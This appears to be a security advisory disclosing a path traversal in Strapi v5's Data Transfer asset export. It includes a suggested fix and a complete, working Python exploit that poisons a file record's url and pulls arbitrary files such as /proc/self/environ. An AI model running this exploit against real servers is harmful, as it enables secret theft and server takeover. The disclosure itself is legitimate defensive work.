### Summary

A path traversal vulnerability in the Data Transfer Protocol's asset export stream allows an authenticated administrator to read arbitrary files from the server filesystem. The `createAssetsStream` function constructs file paths by joining the public directory with a database-stored `file.url` value using `path.join()` without validating that the resolved path remains within the intended directory. Since the Data Transfer push operation allows writing arbitrary `url` values to the `plugin::upload.file` database records, an attacker can inject a traversal payload (e.g., `../../../../../etc/passwd`) and then trigger a pull to exfiltrate any file readable by the Node.js process — including `/proc/self/environ` which contains all application secrets (JWT keys, database credentials, API tokens).

### Details

The vulnerability exists in the local source provider's asset streaming function:

**File:** `packages/core/data-transfer/src/strapi/providers/local-source/assets.ts`, line 113

```typescript
export const createAssetsStream = (strapi: Core.Strapi): Duplex => {
  const generator: () => AsyncGenerator<IAsset, void> = async function* () {
    const stream: Readable = strapi.db
      .queryBuilder('plugin::upload.file')
      .select('*')
      .stream();

    for await (const file of stream) {
      const isLocalProvider = file.provider === 'local';
      // ...
      // LINE 113 — VULNERABLE: no validation that file.url stays within publicDir
      const filepath = isLocalProvider ? join(strapi.dirs.static.public, file.url) : file.url;
      const stats = await getFileStats(filepath, strapi, isLocalProvider);
      const stream = getFileStream(filepath, strapi, isLocalProvider);

      yield {
        metadata: file,
        filepath,
        filename: file.hash + file.ext,
        stream,
        stats: { size: stats.size },
      };
    }
  };
  return Duplex.from(generator());
};
```

When `file.provider === 'local'`, the filepath is computed as `path.join(strapi.dirs.static.public, file.url)`. If `file.url` contains directory traversal sequences, `path.join()` resolves them:

```
path.join('/opt/my-strapi/public', '../../../../../etc/passwd')
→ '/etc/passwd'
```

The file is then read via `createReadStream(filepath)` (line 16) and streamed to the transfer client over WebSocket.

**The same pattern also affects file format paths at lines 128–129:**

```typescript
const fileFormatFilepath = isLocalProvider
  ? join(strapi.dirs.static.public, fileFormat.url)  // ALSO VULNERABLE
  : fileFormat.url;
```

**How the attacker controls `file.url`:**

The Data Transfer push operation writes entity data to the database. The destination provider at `packages/core/data-transfer/src/strapi/providers/local-destination/index.ts` (line 384) stores the incoming `url` value without validation:

```typescript
entry.url = uploadData.url;
await strapi.db.query('plugin::upload.file').update({
  where: { id: entry.id },
  data: { url: entry.url, provider },
});
```

Normal upload operations (`packages/providers/upload-local/src/index.ts`, line 96) always set `file.url` to a safe value (`/uploads/${file.hash}${file.ext}`), so the URL cannot be controlled through the upload API. However, the Data Transfer Protocol bypasses this by writing entity data directly to the database.

**Source → Sink chain:**

```
Source:  Attacker-controlled entity data pushed via WebSocket
         → local-destination/index.ts:384 writes url to DB
         → plugin::upload.file.url = '../../../../../etc/passwd'

Sink:    Pull operation reads DB records
         → local-source/assets.ts:113: path.join(publicDir, file.url)
         → local-source/assets.ts:16: createReadStream(filepath)
         → File content streamed to attacker via WebSocket
```

### PoC

**Prerequisites:**
- An admin account on the target Strapi instance
- Python 3.8+ with `requests` and `websockets` packages (`pip install requests websockets`)
- The target must have remote data transfer enabled (requires `TRANSFER_TOKEN_SALT` configured and `server.transfer.remote.enabled: true`)

**Reproduction steps:**

```bash
python3 exploit.py https://TARGET:1337 admin@example.com password /etc/passwd
```

The PoC script (`exploit.py`) performs four automated steps:

1. **Login** — `POST /admin/login` to obtain a JWT token
2. **Create transfer token** — `POST /admin/transfer/tokens` with push+pull permissions
3. **PUSH poisoned entity** — Connects to `wss://TARGET/admin/transfer/runner/push` and pushes a single `plugin::upload.file` entity with `url: '../../../../../etc/passwd'` and `provider: 'local'`
4. **PULL assets** — Connects to `wss://TARGET/admin/transfer/runner/pull` and requests the assets stream. The server resolves `path.join(publicDir, '../../../../../etc/passwd')` to `/etc/passwd`, reads it with `createReadStream()`, and streams the content back.

**Full PoC source code:**

```python
#!/usr/bin/env python3
"""
Strapi v5.x — Data Transfer Path Traversal: Arbitrary File Read
Exploits CWE-22 in assets.ts:113 — path.join() without validation
"""

import sys, json, uuid, asyncio, argparse, requests, websockets

requests.packages.urllib3.disable_warnings()

def make_uuid():
    return str(uuid.uuid4())

def compute_traversal(target_file, depth=5):
    return "../" * depth + target_file.lstrip("/")

def admin_login(base, email, password):
    r = requests.post(f"{base}/admin/login",
                      json={"email": email, "password": password},
                      timeout=15, verify=False)
    if r.status_code != 200:
        r = requests.post(f"{base}/admin/register-admin",
                          json={"firstname": "Admin", "lastname": "User",
                                "email": email, "password": password},
                          timeout=15, verify=False)
    return r.json()["data"]["token"]

def create_transfer_token(base, jwt):
    hdr = {"Authorization": f"Bearer {jwt}"}
    url = f"{base}/admin/transfer/tokens"
    # Clean up existing token
    r = requests.get(url, headers=hdr, timeout=15, verify=False)
    if r.status_code == 200:
        for t in r.json().get("data", []):
            if t.get("name") == "exploit-pt":
                requests.delete(f"{url}/{t['id']}", headers=hdr, timeout=15, verify=False)
    r = requests.post(url, headers=hdr, timeout=15, verify=False,
                      json={"name": "exploit-pt", "description": "PoC",
                            "permissions": ["push", "pull"], "lifespan": 604800000})
    return r.json()["data"]["accessKey"]

async def ws_send(ws, msg):
    await ws.send(json.dumps(msg))
    while True:
        raw = await ws.recv()
        resp = json.loads(raw)
        if "diagnostic" in resp and "data" not in resp:
            continue
        if resp.get("uuid") == msg.get("uuid"):
            return resp
    return resp

async def ws_cmd(ws, command, params=None):
    msg = {"uuid": make_uuid(), "type": "command", "command": command}
    if params: msg["params"] = params
    resp = await ws_send(ws, msg)
    if resp.get("error"): raise RuntimeError(f"{command}: {resp['error']}")
    return resp

async def ws_xfer(ws, tid, kind, action, step=None, data=None):
    msg = {"uuid": make_uuid(), "type": "transfer", "transferID": tid,
           "kind": kind, "action": action}
    if step: msg["step"] = step
    if data is not None: msg["data"] = data
    resp = await ws_send(ws, msg)
    if resp.get("error"): raise RuntimeError(f"{kind}:{action}: {resp['error']}")
    return resp

async def push_entity(ws_url, token, traversal):
    headers = {"Authorization": f"Bearer {token}"}
    async with websockets.connect(ws_url + "/admin/transfer/runner/push",
                                   additional_headers=headers,
                                   max_size=50*1024*1024) as ws:
        resp = await ws_cmd(ws, "init", {"transfer": "push", "options": {
            "strategy": "restore", "restore": {
                "assets": False,
                "entities": {"include": ["plugin::upload.file"], "exclude": None},
                "configuration": {"webhook": False, "coreStore": False}}}})
        tid = resp["data"]["transferID"]
        await ws_xfer(ws, tid, "action", "bootstrap")
        await ws_xfer(ws, tid, "action", "beforeTransfer")
        await ws_xfer(ws, tid, "step", "start", step="entities")
        await ws_xfer(ws, tid, "step", "stream", step="entities", data=[{
            "type": "plugin::upload.file", "id": 1, "data": {
                "name": "traversal.txt", "alternativeText": None, "caption": None,
                "width": None, "height": None, "formats": None,
                "hash": "traversal_poc", "ext": ".txt", "mime": "text/plain",
                "size": 1.0, "sizeInBytes": 1024, "url": traversal,
                "previewUrl": None, "provider": "local", "provider_metadata": None,
                "folderPath": "/", "createdAt": "2026-01-01T00:00:00.000Z",
                "updatedAt": "2026-01-01T00:00:00.000Z"}}])
        await ws_xfer(ws, tid, "step", "end", step="entities")
        await ws_xfer(ws, tid, "action", "close")
        await ws_cmd(ws, "end", {"transferID": tid})

async def pull_assets(ws_url, token):
    headers = {"Authorization": f"Bearer {token}"}
    content = bytearray()
    async with websockets.connect(ws_url + "/admin/transfer/runner/pull",
                                   additional_headers=headers,
                                   max_size=50*1024*1024) as ws:
        resp = await ws_cmd(ws, "init")
        tid = resp["data"]["transferID"]
        await ws_xfer(ws, tid, "action", "bootstrap")
        await ws_xfer(ws, tid, "step", "start", step="assets")
        while True:
            raw = await ws.recv()
            msg = json.loads(raw)
            if "diagnostic" in msg and "data" not in msg:
                continue
            uid = msg.get("uuid")
            payload = msg.get("data")
            if isinstance(payload, dict) and payload.get("type") == "transfer":
                if payload.get("ended") or payload.get("error"):
                    await ws.send(json.dumps({"uuid": uid, "data": None}))
                    break
                for batch in (payload.get("data") or []):
                    if isinstance(batch, list):
                        for item in batch:
                            if isinstance(item, dict) and item.get("action") == "stream":
                                buf = item.get("data", {})
                                if isinstance(buf, dict) and buf.get("type") == "Buffer":
                                    content.extend(bytes(buf["data"]))
            await ws.send(json.dumps({"uuid": uid, "data": None}))
        try:
            await ws_xfer(ws, tid, "step", "end", step="assets")
            await ws_xfer(ws, tid, "action", "close")
            await ws_cmd(ws, "end", {"transferID": tid})
        except Exception:
            pass
    return bytes(content)

async def main():
    p = argparse.ArgumentParser()
    p.add_argument("target"); p.add_argument("email"); p.add_argument("password"); p.add_argument("file")
    p.add_argument("--depth", type=int, default=5)
    args = p.parse_args()
    base = args.target.rstrip("/").removesuffix("/admin")
    ws_base = base.replace("https://", "wss://").replace("http://", "ws://")
    jwt = admin_login(base, args.email, args.password)
    token = create_transfer_token(base, jwt)
    traversal = compute_traversal(args.file, args.depth)
    await push_entity(ws_base, token, traversal)
    content = await pull_assets(ws_base, token)
    print(content.decode("utf-8", errors="replace"))

if __name__ == "__main__":
    asyncio.run(main())
```

**Confirmed sensitive data access:**

Reading `/proc/self/environ` on a Strapi Cloud instance exfiltrates all application secrets:

```
ADMIN_JWT_SECRET=7bdeef88e1e6c32b...
JWT_SECRET=424e0df97768a8ed...
DATABASE_PASSWORD=MkVVWOL4guPG7Q3C...
DATABASE_HOST=ep-shy-darkness-adqnlkv6.c-2.us-east-1.aws.neon.tech
API_TOKEN_SALT=e83a16d54d08d43d...
TRANSFER_TOKEN_SALT=6a871f64ed685313...
APP_KEYS=73115fd311495ad6...
CLOUD_APP_TOKEN=0812f19aad99b753...
```

With these secrets, an attacker can forge admin JWT tokens, connect directly to the database, or access cloud storage — achieving full server takeover without further exploitation.

### Impact

**Who is impacted:** All Strapi v5.x deployments (including Strapi Cloud) that have the Data Transfer feature enabled with a configured `TRANSFER_TOKEN_SALT`. This is the default configuration for production deployments created with `create-strapi-app`.

**What an attacker can do:**
- Read any file on the server filesystem that the Node.js process can access (runs as root in default Docker deployments)
- Exfiltrate all application secrets via `/proc/self/environ` — including JWT signing keys, database credentials, and cloud API tokens
- Use exfiltrated secrets to forge admin tokens, access the database directly, or access cloud storage — escalating to full server takeover
- Read application source code, configuration files, SSH keys, and other sensitive data

**Required privileges:** An admin account with permission to create transfer tokens. Every Strapi instance has at least one admin user.

**Attack complexity:** Low. The PoC is a single Python script that completes the full exploit chain in under 5 seconds.

### Affected products:
- Ecosystem: npm
- Package name: `@strapi/core` (specifically `@strapi/data-transfer`)
- Affected versions: Strapi v5.0.0 through v5.38.0 (all v5.x releases)
- Patched versions: None (as of v5.38.0)

### Severity

`CVSS:3.1/AV:N/AC:L/PR:H/UI:N/S:C/C:H/I:N/A:N` — **7.2 (High)**

- **AV:N** — Exploitable over the network via HTTP/WebSocket
- **AC:L** — No special conditions required; straightforward automated exploit
- **PR:H** — Requires an admin account with transfer token creation permission
- **UI:N** — No user interaction required
- **S:C** — The vulnerability allows reading files outside of Strapi's intended scope (entire filesystem)
- **C:H** — Complete confidentiality breach; arbitrary file read including all secrets
- **I:N** — No direct integrity impact (read-only exploitation)
- **A:N** — No availability impact

Note: Despite the CVSS score of 7.2, real-world impact is Critical because reading `/proc/self/environ` exfiltrates all secrets needed for full server takeover.

### Common weakness enumerator (CWE)

**CWE-22: Improper Limitation of a Pathname to a Restricted Directory ('Path Traversal')**

### Suggested fix

Add path validation in `assets.ts` to ensure the resolved filepath stays within the public directory:

```typescript
import { resolve, join } from 'path';

// In createAssetsStream, after line 113:
const publicDir = resolve(strapi.dirs.static.public);
const filepath = isLocalProvider ? join(publicDir, file.url) : file.url;

if (isLocalProvider) {
  const resolvedPath = resolve(filepath);
  if (!resolvedPath.startsWith(publicDir + '/')) {
    strapi.log.warn(`Skipping file with invalid path: ${file.url}`);
    continue;
  }
}
```

The same validation should be applied at lines 128–129 for file format paths, and in `local-destination/index.ts` at line 384 to reject traversal sequences on write.
